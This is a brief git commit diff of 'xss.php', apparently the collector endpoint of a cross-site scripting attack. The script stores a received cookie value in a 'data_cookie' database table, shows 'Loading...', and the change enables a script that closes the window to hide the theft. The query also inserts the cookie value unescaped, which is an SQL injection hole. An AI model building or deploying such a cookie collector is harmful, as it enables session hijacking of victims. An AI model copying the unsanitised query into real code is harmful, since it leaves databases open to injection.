8b4eec8c629fc8c4aee31c9a554a5110cd0e93a8
Federico <federicodebona@hotmail.it>
2019-12-13 09:40:44 +0100

    s

--- xss.php
+++ xss.php
@@ -4,5 +4,5 @@ $l = new mysqli("127.0.0.1", "root", "", "xss");
 $l->query("INSERT INTO data_cookie (cookie) VALUES ('$cookie')");
 $l->close();
 echo "Loading...";
-//echo "<script>window.close()</script>";
+echo "<script>window.close()</script>";
 ?>
